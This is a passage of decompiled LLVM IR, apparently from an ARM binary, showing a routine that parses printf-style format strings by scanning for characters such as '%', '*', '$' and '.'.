  %v2_11670 = inttoptr i32 %v1_11670 to i8*
  %v3_11670 = load i8, i8* %v2_11670, align 1
  %v4_11670 = zext i8 %v3_11670 to i32
  %v1_11674 = inttoptr i32 %v1_1166c to i8*
  %v2_11674 = load i8, i8* %v1_11674, align 2
  %v3_11674 = zext i8 %v2_11674 to i32
  %v3_11678 = mul nuw i32 %v4_11670, 16777216
  %v4_1167c = sdiv i32 %v3_11678, 65536
  %v5_1167c = or i32 %v4_1167c, %v3_11674
  %v9_11680 = icmp eq i32 %v5_1167c, %v1_11680.pre
  br i1 %v9_11680, label %dec_label_pc_1166c.dec_label_pc_11694_crit_edge, label %dec_label_pc_11688

dec_label_pc_1166c.dec_label_pc_11694_crit_edge:  ; preds = %dec_label_pc_1166c
  br label %dec_label_pc_11694

dec_label_pc_11688:                               ; preds = %dec_label_pc_1166c
  %tmp = icmp ugt i32 %v1_1166c, ptrtoint (i32* @global_var_175d4.263 to i32)
  br i1 %tmp, label %dec_label_pc_1166c, label %dec_label_pc_11694

dec_label_pc_11694:                               ; preds = %dec_label_pc_11688, %dec_label_pc_1166c.dec_label_pc_11694_crit_edge
  %v2_1169c.pre-phi = sub i32 %v1_1166c, ptrtoint (i32* @global_var_175d4.263 to i32)
  store i32 ptrtoint (i32* @global_var_175ec.261 to i32), i32* @r2, align 4
  %v4_116a0 = sdiv i32 %v2_1169c.pre-phi, 2
  %v5_116a0 = add i32 %v4_116a0, ptrtoint (i32* @global_var_175ec.261 to i32)
  %v6_116a0 = inttoptr i32 %v5_116a0 to i8*
  %v7_116a0 = load i8, i8* %v6_116a0, align 1
  %v9_116a0 = zext i8 %v7_116a0 to i32
  ret i32 %v9_116a0

; uselistorder directives
  uselistorder i32 %v1_1166c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1166c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_175ec.261 to i32), { 1, 2, 0 }
}

define i32 @function_116b4(i32* %arg1) local_unnamed_addr {
dec_label_pc_116b4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp106 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_116b4 = load i32, i32* @r4, align 4
  store i32 %v3_116b4, i32* %stack_var_-32, align 4
  %v6_116b4 = load i32, i32* @r5, align 4
  %v25_116b4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_116b8 = add i32 %tmp, 16
  %v2_116b8 = inttoptr i32 %v1_116b8 to i32*
  %v3_116b8 = load i32, i32* %v2_116b8, align 4
  %v2_116bc = ptrtoint i32* %stack_var_-88 to i32
  %v1_116c0 = and i32 %v3_116b8, 128
  store i32 %v1_116c0, i32* @r4, align 4
  %v2_116c0 = icmp eq i32 %v1_116c0, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r7.global-to-local, align 4
  %v1_116e0 = add i32 %tmp, 24
  %v2_116e0 = inttoptr i32 %v1_116e0 to i32*
  %v3_116e0 = load i32, i32* %v2_116e0, align 4
  store i32 %v3_116e0, i32* %sb.global-to-local, align 4
  br i1 %v2_116c0, label %bb, label %dec_label_pc_11700

bb:                                               ; preds = %dec_label_pc_116b4
  %v3_116e4 = load i32, i32* %arg1, align 4
  br label %dec_label_pc_1174c

dec_label_pc_116f0:                               ; preds = %dec_label_pc_118d0
  %v0_116f0 = load i32, i32* %r0.global-to-local, align 4
  %v0_11900.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_118f8

dec_label_pc_116f8:                               ; preds = %dec_label_pc_118fc
  %v1_116f8 = add i32 %v0_11900.pre, 1
  store i32 %v1_116f8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11918

dec_label_pc_11700:                               ; preds = %dec_label_pc_116b4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11704

dec_label_pc_11704:                               ; preds = %dec_label_pc_11738.dec_label_pc_11704_crit_edge, %dec_label_pc_11700
  %v1_11714 = phi i32 [ %v1_11728, %dec_label_pc_11738.dec_label_pc_11704_crit_edge ], [ 0, %dec_label_pc_11700 ]
  %v0_11704 = phi i32 [ %v0_11704.pre, %dec_label_pc_11738.dec_label_pc_11704_crit_edge ], [ %tmp, %dec_label_pc_11700 ]
  %v1_11704 = inttoptr i32 %v0_11704 to i32*
  %v2_11704 = load i32, i32* %v1_11704, align 4
  %v4_11708 = mul i32 %v1_11714, 4
  %v5_11708 = add i32 %v2_11704, %v4_11708
  store i32 %v5_11708, i32* %r3.global-to-local, align 4
  %v1_1170c = add i32 %v5_11708, -4
  %v2_1170c = inttoptr i32 %v1_1170c to i32*
  %v3_1170c = load i32, i32* %v2_1170c, align 4
  store i32 %v3_1170c, i32* %r1.global-to-local, align 4
  store i32 %v25_116b4, i32* %ip.global-to-local, align 4
  %v2_11714 = add i32 %v1_11714, %v25_116b4
  store i32 %v2_11714, i32* %r2.global-to-local, align 4
  %v1_11718 = trunc i32 %v3_1170c to i8
  %v3_11718 = add i32 %v2_11714, -56
  %v4_11718 = inttoptr i32 %v3_11718 to i8*
  store i8 %v1_11718, i8* %v4_11718, align 1
  %v0_1171c = load i32, i32* %r2.global-to-local, align 4
  %v1_1171c = add i32 %v0_1171c, -56
  %v2_1171c = inttoptr i32 %v1_1171c to i8*
  %v3_1171c = load i8, i8* %v2_1171c, align 1
  %v4_1171c = zext i8 %v3_1171c to i32
  store i32 %v4_1171c, i32* %r2.global-to-local, align 4
  %v0_11720 = load i32, i32* %r3.global-to-local, align 4
  %v1_11720 = add i32 %v0_11720, -4
  %v2_11720 = inttoptr i32 %v1_11720 to i32*
  %v3_11720 = load i32, i32* %v2_11720, align 4
  store i32 %v3_11720, i32* %r3.global-to-local, align 4
  %v9_11724 = icmp eq i32 %v4_1171c, %v3_11720
  %v0_11728 = load i32, i32* %r0.global-to-local, align 4
  %v1_11728 = add i32 %v0_11728, 1
  store i32 %v1_11728, i32* %r0.global-to-local, align 4
  br i1 %v9_11724, label %dec_label_pc_11730, label %dec_label_pc_11b48

dec_label_pc_11730:                               ; preds = %dec_label_pc_11704
  %v2_11730 = icmp eq i8 %v3_1171c, 0
  br i1 %v2_11730, label %dec_label_pc_11740, label %dec_label_pc_11738

dec_label_pc_11738:                               ; preds = %dec_label_pc_11730
  %tmp166 = icmp ult i32 %v1_11728, 32
  br i1 %tmp166, label %dec_label_pc_11738.dec_label_pc_11704_crit_edge, label %dec_label_pc_11740

dec_label_pc_11738.dec_label_pc_11704_crit_edge:  ; preds = %dec_label_pc_11738
  %v0_11704.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11704

dec_label_pc_11740:                               ; preds = %dec_label_pc_11738, %dec_label_pc_11730
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11748 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_1174c

dec_label_pc_1174c:                               ; preds = %bb, %dec_label_pc_11740
  %storemerge102 = phi i32 [ %v2_11748, %dec_label_pc_11740 ], [ %v3_116e4, %bb ]
  store i32 %storemerge102, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_1175c

dec_label_pc_11758:                               ; preds = %.thread22, %dec_label_pc_11868
  %v0_11758 = phi i32 [ %v2_118e0, %.thread22 ], [ %storemerge105, %dec_label_pc_11868 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.3, %.thread22 ], [ %stack_var_-48.2, %dec_label_pc_11868 ]
  store i32 %v0_11758, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1175c

dec_label_pc_1175c:                               ; preds = %dec_label_pc_1174c, %dec_label_pc_11758
  %v1_11778 = phi i32 [ %storemerge102, %dec_label_pc_1174c ], [ %v0_11758, %dec_label_pc_11758 ]
  %stack_var_-48.1 = phi i32 [ %tmp106, %dec_label_pc_1174c ], [ %stack_var_-48.0, %dec_label_pc_11758 ]
  %v1_1175c = inttoptr i32 %v1_11778 to i8*
  %v2_1175c = load i8, i8* %v1_1175c, align 1
  %v3_1175c = zext i8 %v2_1175c to i32
  store i32 %v3_1175c, i32* %r3.global-to-local, align 4
  %v7_11760 = icmp eq i8 %v2_1175c, 42
  br i1 %v7_11760, label %bb124, label %.thread9.thread

.thread9.thread:                                  ; preds = %dec_label_pc_1175c
  store i32 %v1_11778, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

bb124:                                            ; preds = %dec_label_pc_1175c
  %v1_1176c = load i32, i32* @lr, align 4
  %v4_1176c = mul i32 %v1_1176c, -4
  %v5_1176c = add i32 %v4_1176c, %v25_116b4
  store i32 %v5_1176c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_11778 = add i32 %v1_11778, 1
  store i32 %v2_11778, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_11780 = add i32 %v5_1176c, -12
  %v4_11780 = inttoptr i32 %v3_11780 to i32*
  store i32 0, i32* %v4_11780, align 4
  %v0_117a4.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb124, %.thread9.thread
  %v0_117a4.pre = phi i32 [ %v0_117a4.pre.pre, %bb124 ], [ %v1_11778, %.thread9.thread ]
  %v2_117a8.pre = load i32, i32* @global_var_20278, align 4
  br label %.backedge

dec_label_pc_11788:                               ; preds = %.backedge
  store i32 4094, i32* %r3.global-to-local, align 4
  %v0_1178c = load i32, i32* %r0.global-to-local, align 4
  %v7_11790 = icmp sgt i32 %v0_1178c, 4094
  br i1 %v7_11790, label %.thread12, label %bb126

.thread12:                                        ; preds = %dec_label_pc_11788
  %v1_1179814 = add i32 %v0_1181c, 1
  store i32 %v1_1179814, i32* %r6.global-to-local, align 4
  br label %.backedge

bb126:                                            ; preds = %dec_label_pc_11788
  %v11_11794 = mul i32 %v0_1178c, 10
  %v12_11794 = add i32 %v11_11794, %v3_117a4
  store i32 %v12_11794, i32* %r3.global-to-local, align 4
  %v1_11798 = add i32 %v0_1181c, 1
  store i32 %v1_11798, i32* %r6.global-to-local, align 4
  %v9_1179c = add i32 %v12_11794, -48
  store i32 %v9_1179c, i32* %r0.global-to-local, align 4
  br label %.backedge

.backedge:                                        ; preds = %.thread12, %bb126, %.preheader
  %v0_1181c = phi i32 [ %v0_117a4.pre, %.preheader ], [ %v1_11798, %bb126 ], [ %v1_1179814, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_20278 to i32), i32* %r3.global-to-local, align 4
  %v1_117a4 = inttoptr i32 %v0_1181c to i8*
  %v2_117a4 = load i8, i8* %v1_117a4, align 1
  %v3_117a4 = zext i8 %v2_117a4 to i32
  store i32 %v3_117a4, i32* %r2.global-to-local, align 4
  store i32 %v2_117a8.pre, i32* %r3.global-to-local, align 4
  %v3_117ac = mul nuw nsw i32 %v3_117a4, 2
  %v4_117ac = add i32 %v3_117ac, %v2_117a8.pre
  %v5_117ac = inttoptr i32 %v4_117ac to i8*
  %v6_117ac = load i8, i8* %v5_117ac, align 1
  %v8_117ac = zext i8 %v6_117ac to i32
  store i32 %v8_117ac, i32* %r3.global-to-local, align 4
  %v1_117b0 = and i32 %v8_117ac, 8
  %v2_117b0 = icmp eq i32 %v1_117b0, 0
  br i1 %v2_117b0, label %dec_label_pc_117b8, label %dec_label_pc_11788

dec_label_pc_117b8:                               ; preds = %.backedge
  %v0_117b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_117b8 = add i32 %v0_117b8, -1
  %v2_117b8 = inttoptr i32 %v1_117b8 to i8*
  %v3_117b8 = load i8, i8* %v2_117b8, align 1
  %v4_117b8 = zext i8 %v3_117b8 to i32
  store i32 %v4_117b8, i32* %r3.global-to-local, align 4
  %v7_117bc = icmp eq i8 %v3_117b8, 37
  br i1 %v7_117bc, label %dec_label_pc_117c4, label %dec_label_pc_11880

dec_label_pc_117c4:                               ; preds = %dec_label_pc_117b8
  %v7_117c4 = icmp eq i8 %v2_117a4, 36
  %. = zext i1 %v7_117c4 to i32
  store i32 %., i32* %ip.global-to-local, align 4
  %v0_117d0 = load i32, i32* %r0.global-to-local, align 4
  %tmp129 = icmp slt i32 %v0_117d0, 1
  br i1 %tmp129, label %bb130, label %thread-pre-split

bb130:                                            ; preds = %dec_label_pc_117c4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_117c4, %bb130
  %v1_1182c = phi i32 [ 0, %bb130 ], [ %., %dec_label_pc_117c4 ]
  %v2_117d8 = icmp eq i32 %v1_1182c, 0
  %v0_11808 = load i32, i32* %sb.global-to-local, align 4
  br i1 %v2_117d8, label %dec_label_pc_11808, label %dec_label_pc_117e0

dec_label_pc_117e0:                               ; preds = %thread-pre-split
  %v2_11808 = icmp eq i32 %v0_11808, 0
  %v1_117e4 = add i32 %v0_1181c, 1
  store i32 %v1_117e4, i32* %r1.global-to-local, align 4
  br i1 %v2_11808, label %dec_label_pc_11b48, label %dec_label_pc_117ec

dec_label_pc_117ec:                               ; preds = %dec_label_pc_117e0
  %v2_117ec = sub i32 %v0_117d0, %v0_11808
  %v4_117ec = xor i32 %v0_11808, %v0_117d0
  %v5_117ec = xor i32 %v2_117ec, %v0_117d0
  %v6_117ec = and i32 %v5_117ec, %v4_117ec
  %v7_117ec = icmp slt i32 %v6_117ec, 0
  %v8_117ec = icmp slt i32 %v2_117ec, 0
  %v9_117ec = icmp eq i32 %v0_117d0, %v0_11808
  %v3_117f0 = xor i1 %v8_117ec, %v7_117ec
  %v4_117f0 = or i1 %v9_117ec, %v3_117f0
  br i1 %v4_117f0, label %dec_label_pc_11800, label %bb131

bb131:                                            ; preds = %dec_label_pc_117ec
  store i32 %v0_117d0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11800

dec_label_pc_117fc:                               ; preds = %dec_label_pc_1181c, %dec_label_pc_11824
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %bb131, %dec_label_pc_117ec, %dec_label_pc_117fc
  %v0_11800 = phi i32 [ %v0_117b8, %dec_label_pc_117fc ], [ %v1_117e4, %dec_label_pc_117ec ], [ %v1_117e4, %bb131 ]
  %stack_var_-48.2 = phi i32 [ %stack_var_-48.1, %dec_label_pc_117fc ], [ %v0_117d0, %dec_label_pc_117ec ], [ %v0_117d0, %bb131 ]
  br label %dec_label_pc_11838

dec_label_pc_11808:                               ; preds = %thread-pre-split
  %tmp132 = icmp slt i32 %v0_11808, 1
  br i1 %tmp132, label %dec_label_pc_1181c, label %dec_label_pc_11810

dec_label_pc_11810:                               ; preds = %dec_label_pc_11808
  %v7_11810 = icmp eq i8 %v2_117a4, 109
  br i1 %v7_11810, label %dec_label_pc_11880, label %dec_label_pc_11b48

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11808
  %tmp167 = icmp ugt i32 %v0_1181c, %v0_117b8
  br i1 %tmp167, label %dec_label_pc_11824, label %dec_label_pc_117fc

dec_label_pc_11824:                               ; preds = %dec_label_pc_1181c
  %v1_11824 = inttoptr i32 %v0_117b8 to i8*
  %v2_11824 = load i8, i8* %v1_11824, align 1
  %v3_11824 = zext i8 %v2_11824 to i32
  store i32 %v3_11824, i32* %r3.global-to-local, align 4
  %v7_11828 = icmp eq i8 %v2_11824, 48
  br i1 %v7_11828, label %dec_label_pc_117fc, label %bb133

bb133:                                            ; preds = %dec_label_pc_11824
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11880

dec_label_pc_11838.loopexit:                      ; preds = %dec_label_pc_11840
  %v1_1184c = load i32, i32* @r4, align 4
  %v3_1184c = or i32 %v1_1184c, %v0_11860
  store i32 %v3_1184c, i32* @r4, align 4
  %v2_11850 = add i32 %storemerge105, 1
  br label %dec_label_pc_11838

dec_label_pc_11838:                               ; preds = %dec_label_pc_11838.loopexit, %dec_label_pc_11800
  %storemerge105 = phi i32 [ %v0_11800, %dec_label_pc_11800 ], [ %v2_11850, %dec_label_pc_11838.loopexit ]
  store i32 %storemerge105, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_175cc.268 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_11844 = inttoptr i32 %storemerge105 to i8*
  br label %dec_label_pc_11840

dec_label_pc_11840:                               ; preds = %dec_label_pc_11858, %dec_label_pc_11838
  %v0_11860 = phi i32 [ %v2_11860, %dec_label_pc_11858 ], [ 1, %dec_label_pc_11838 ]
  %v0_11840 = phi i32 [ %v5_11840, %dec_label_pc_11858 ], [ ptrtoint ([8 x i8]* @global_var_175cc.268 to i32), %dec_label_pc_11838 ]
  %v1_11840 = inttoptr i32 %v0_11840 to i8*
  %v2_11840 = load i8, i8* %v1_11840, align 1
  %v3_11840 = zext i8 %v2_11840 to i32
  store i32 %v3_11840, i32* %r2.global-to-local, align 4
  %v5_11840 = add i32 %v0_11840, 1
  store i32 %v5_11840, i32* %r1.global-to-local, align 4
  %v2_11844 = load i8, i8* %v1_11844, align 1
  %v3_11844 = zext i8 %v2_11844 to i32
  store i32 %v3_11844, i32* %r3.global-to-local, align 4
  %v9_11848 = icmp eq i8 %v2_11844, %v2_11840
  br i1 %v9_11848, label %dec_label_pc_11838.loopexit, label %dec_label_pc_11858

dec_label_pc_11858:                               ; preds = %dec_label_pc_11840
  %v1_11858 = inttoptr i32 %v5_11840 to i8*
  %v2_11858 = load i8, i8* %v1_11858, align 1
  %v3_11858 = zext i8 %v2_11858 to i32
  store i32 %v3_11858, i32* %r3.global-to-local, align 4
  %v2_1185c = icmp eq i8 %v2_11858, 0
  %v2_11860 = mul i32 %v0_11860, 2
  store i32 %v2_11860, i32* %r0.global-to-local, align 4
  br i1 %v2_1185c, label %dec_label_pc_11868, label %dec_label_pc_11840

dec_label_pc_11868:                               ; preds = %dec_label_pc_11858
  %v1_11868 = add i32 %storemerge105, -1
  %v2_11868 = inttoptr i32 %v1_11868 to i8*
  %v3_11868 = load i8, i8* %v2_11868, align 1
  %v7_1186c = icmp eq i8 %v3_11868, 37
  %v0_11870 = load i32, i32* @r4, align 4
  %v1_11870 = and i32 %v0_11870, 10
  store i32 %v1_11870, i32* %r3.global-to-local, align 4
  %v4_11874 = udiv i32 %v1_11870, 2
  %v5_11874 = sub nuw nsw i32 -1, %v4_11874
  %v6_11874 = and i32 %v0_11870, %v5_11874
  store i32 %v6_11874, i32* @r4, align 4
  br i1 %v7_1186c, label %dec_label_pc_1187c, label %dec_label_pc_11758

dec_label_pc_1187c:                               ; preds = %dec_label_pc_11868
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11880

dec_label_pc_11880:                               ; preds = %bb133, %dec_label_pc_117b8, %dec_label_pc_11810, %dec_label_pc_1187c
  %v1_118c4 = phi i32 [ %storemerge105, %dec_label_pc_1187c ], [ %v0_1181c, %bb133 ], [ %v0_1181c, %dec_label_pc_11810 ], [ %v0_1181c, %dec_label_pc_117b8 ]
  %v0_118c0 = phi i32 [ %v5_11840, %dec_label_pc_1187c ], [ %v0_117b8, %bb133 ], [ %v0_117b8, %dec_label_pc_11810 ], [ %v0_117b8, %dec_label_pc_117b8 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_1187c ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_11810 ], [ %stack_var_-48.1, %dec_label_pc_117b8 ]
  %v1_11880 = inttoptr i32 %v0_118c0 to i8*
  %v2_11880 = load i8, i8* %v1_11880, align 1
  %v3_11880 = zext i8 %v2_11880 to i32
  store i32 %v3_11880, i32* %r3.global-to-local, align 4
  %v7_11884 = icmp eq i8 %v2_11880, 42
  br i1 %v7_11884, label %dec_label_pc_1188c, label %dec_label_pc_118d0

dec_label_pc_1188c:                               ; preds = %dec_label_pc_11880
  %v0_1188c = load i32, i32* %sb.global-to-local, align 4
  %v2_1188c = icmp eq i32 %v0_1188c, 0
  br i1 %v2_1188c, label %dec_label_pc_118c0, label %dec_label_pc_11894

dec_label_pc_11894:                               ; preds = %dec_label_pc_1188c
  %v1_11894 = inttoptr i32 %v1_118c4 to i8*
  %v2_11894 = load i8, i8* %v1_11894, align 1
  %v3_11894 = zext i8 %v2_11894 to i32
  store i32 %v3_11894, i32* %r3.global-to-local, align 4
  %v7_11898 = icmp eq i8 %v2_11894, 36
  br i1 %v7_11898, label %dec_label_pc_118a0, label %dec_label_pc_11b48

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11894
  %v0_118a0 = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_118a0, 1
  br i1 %tmp134, label %dec_label_pc_11b48, label %dec_label_pc_118a8

dec_label_pc_118a8:                               ; preds = %dec_label_pc_118a0
  store i32 %v25_116b4, i32* %r1.global-to-local, align 4
  %v0_118b0 = load i32, i32* @lr, align 4
  %v3_118b0 = mul i32 %v0_118b0, -4
  %v4_118b0 = add i32 %v3_118b0, %v25_116b4
  store i32 %v4_118b0, i32* %r3.global-to-local, align 4
  %v1_118b4 = add i32 %v1_118c4, 1
  store i32 %v1_118b4, i32* %r6.global-to-local, align 4
  %v2_118b8 = add i32 %v4_118b0, -24
  %v3_118b8 = inttoptr i32 %v2_118b8 to i32*
  store i32 %v0_118a0, i32* %v3_118b8, align 4
  br label %dec_label_pc_118cc

dec_label_pc_118c0:                               ; preds = %dec_label_pc_1188c
  %v1_118c0 = add i32 %v0_118c0, 1
  store i32 %v1_118c0, i32* %r3.global-to-local, align 4
  %v9_118c4 = icmp eq i32 %v1_118c0, %v1_118c4
  br i1 %v9_118c4, label %dec_label_pc_118cc, label %dec_label_pc_11b48

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118c0, %dec_label_pc_118a8
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_118d0

dec_label_pc_118d0:                               ; preds = %dec_label_pc_11880, %dec_label_pc_118cc
  %v0_118d0 = load i32, i32* @lr, align 4
  %v2_118d0 = icmp eq i32 %v0_118d0, 0
  br i1 %v2_118d0, label %dec_label_pc_118d8, label %dec_label_pc_116f0

dec_label_pc_118d8:                               ; preds = %dec_label_pc_118d0
  %v0_118d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_118d8 = inttoptr i32 %v0_118d8 to i8*
  %v2_118d8 = load i8, i8* %v1_118d8, align 1
  %v3_118d8 = zext i8 %v2_118d8 to i32
  store i32 %v3_118d8, i32* %r3.global-to-local, align 4
  %v7_118dc = icmp eq i8 %v2_118d8, 46
  br i1 %v7_118dc, label %.thread22, label %dec_label_pc_118f0

.thread22:                                        ; preds = %dec_label_pc_118d8
  %v2_118e0 = add i32 %v0_118d8, 1
  store i32 %v2_118e0, i32* %r6.global-to-local, align 4
  %v1_118e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_118e4, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_11758

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118d8
  %v0_118f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_118f0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_118f8

dec_label_pc_118f8:                               ; preds = %dec_label_pc_116f0, %dec_label_pc_118f0
  %v0_11900.pre = phi i32 [ %v0_118d8, %dec_label_pc_118f0 ], [ %v0_11900.pre.pre, %dec_label_pc_116f0 ]
  %storemerge = phi i32 [ -1, %dec_label_pc_118f0 ], [ %v0_116f0, %dec_label_pc_116f0 ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_17574.270 to i32), i32* %r1.global-to-local, align 4
  %v1_11900 = inttoptr i32 %v0_11900.pre to i8*
  br label %dec_label_pc_118fc

dec_label_pc_118fc:                               ; preds = %dec_label_pc_1190c, %dec_label_pc_118f8
  %v0_1190c = phi i32 [ %v1_1190c, %dec_label_pc_1190c ], [ ptrtoint ([9 x i8]* @global_var_17574.270 to i32), %dec_label_pc_118f8 ]
  %v1_118fc = inttoptr i32 %v0_1190c to i8*
  %v2_118fc = load i8, i8* %v1_118fc, align 1
  %v3_118fc = zext i8 %v2_118fc to i32
  store i32 %v3_118fc, i32* %r2.global-to-local, align 4
  %v2_11900 = load i8, i8* %v1_11900, align 1
  %v3_11900 = zext i8 %v2_11900 to i32
  store i32 %v3_11900, i32* %r3.global-to-local, align 4
  %v9_11904 = icmp eq i8 %v2_11900, %v2_118fc
  br i1 %v9_11904, label %dec_label_pc_116f8, label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %dec_label_pc_118fc
  %v1_1190c = add i32 %v0_1190c, 1
  %v2_1190c = inttoptr i32 %v1_1190c to i8*
  %v3_1190c = load i8, i8* %v2_1190c, align 1
  %v4_1190c = zext i8 %v3_1190c to i32
  store i32 %v4_1190c, i32* %r3.global-to-local, align 4
  store i32 %v1_1190c, i32* %r1.global-to-local, align 4
  %v2_11910 = icmp eq i8 %v3_1190c, 0
  br i1 %v2_11910, label %dec_label_pc_11918, label %dec_label_pc_118fc

dec_label_pc_11918:                               ; preds = %dec_label_pc_1190c, %dec_label_pc_116f8
  %v1_11938 = phi i32 [ %v1_116f8, %dec_label_pc_116f8 ], [ %v0_11900.pre, %dec_label_pc_1190c ]
  %v1_11934 = phi i32 [ %v0_1190c, %dec_label_pc_116f8 ], [ %v1_1190c, %dec_label_pc_1190c ]
  %v2_1191c = sub i32 %v1_11934, ptrtoint ([9 x i8]* @global_var_17574.270 to i32)
  store i32 %v2_1191c, i32* %r3.global-to-local, align 4
  %v8_11924 = icmp sgt i32 %v2_1191c, 1
  br i1 %v8_11924, label %.thread25, label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %dec_label_pc_11918
  %v1_11928 = inttoptr i32 %v1_11938 to i8*
  %v2_11928 = load i8, i8* %v1_11928, align 1
  %v3_11928 = zext i8 %v2_11928 to i32
  store i32 %v3_11928, i32* %r2.global-to-local, align 4
  %v1_1192c = inttoptr i32 %v1_11934 to i8*
  %v2_1192c = load i8, i8* %v1_1192c, align 1
  %v3_1192c = zext i8 %v2_1192c to i32
  store i32 %v3_1192c, i32* %r3.global-to-local, align 4
  %v9_11930 = icmp eq i8 %v2_11928, %v2_1192c
  br i1 %v9_11930, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_11928
  %v2_11934 = add i32 %v1_11934, 9
  store i32 %v2_11934, i32* %r1.global-to-local, align 4
  %v2_11938 = add i32 %v1_11938, 1
  store i32 %v2_11938, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_11928, %dec_label_pc_11918, %bb135
  %v0_11940 = phi i32 [ %v1_11934, %dec_label_pc_11928 ], [ %v1_11934, %dec_label_pc_11918 ], [ %v2_11934, %bb135 ]
  %v0_1193c = phi i32 [ %v1_11938, %dec_label_pc_11928 ], [ %v1_11938, %dec_label_pc_11918 ], [ %v2_11938, %bb135 ]
  %v1_1193c = inttoptr i32 %v0_1193c to i8*
  %v2_1193c = load i8, i8* %v1_1193c, align 1
  %v3_1193c = zext i8 %v2_1193c to i32
  store i32 %v3_1193c, i32* %r2.global-to-local, align 4
  %v1_11940 = add i32 %v0_11940, 9
  %v2_11940 = inttoptr i32 %v1_11940 to i8*
  %v3_11940 = load i8, i8* %v2_11940, align 1
  %v4_11940 = zext i8 %v3_11940 to i32
  store i32 %v4_11940, i32* %r3.global-to-local, align 4
  %v2_11944 = icmp eq i8 %v2_1193c, 0
  %v3_11948 = mul nuw nsw i32 %v4_11940, 256
  store i32 %v3_11948, i32* @lr, align 4
  br i1 %v2_11944, label %dec_label_pc_11b48, label %dec_label_pc_11950

dec_label_pc_11950:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_175b4.272 to i32), i32* %ip.global-to-local, align 4
  %v3_11954 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_11954, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11958

dec_label_pc_11958:                               ; preds = %dec_label_pc_119dc, %dec_label_pc_11950
  %v1_11968 = phi i32 [ %v1_119dc, %dec_label_pc_119dc ], [ ptrtoint ([21 x i8]* @global_var_175b4.272 to i32), %dec_label_pc_11950 ]
  %v1_11958 = inttoptr i32 %v1_11968 to i8*
  %v2_11958 = load i8, i8* %v1_11958, align 1
  %v3_11958 = zext i8 %v2_11958 to i32
  store i32 %v3_11958, i32* %r3.global-to-local, align 4
  %v9_1195c = icmp eq i8 %v2_11958, %v2_1193c
  br i1 %v9_1195c, label %dec_label_pc_11964, label %dec_label_pc_119dc

dec_label_pc_11964:                               ; preds = %dec_label_pc_11958
  store i32 ptrtoint ([21 x i8]* @global_var_175b4.272 to i32), i32* %r3.global-to-local, align 4
  %v2_11968 = sub i32 %v1_11968, ptrtoint ([21 x i8]* @global_var_175b4.272 to i32)
  store i32 %v2_11968, i32* %r2.global-to-local, align 4
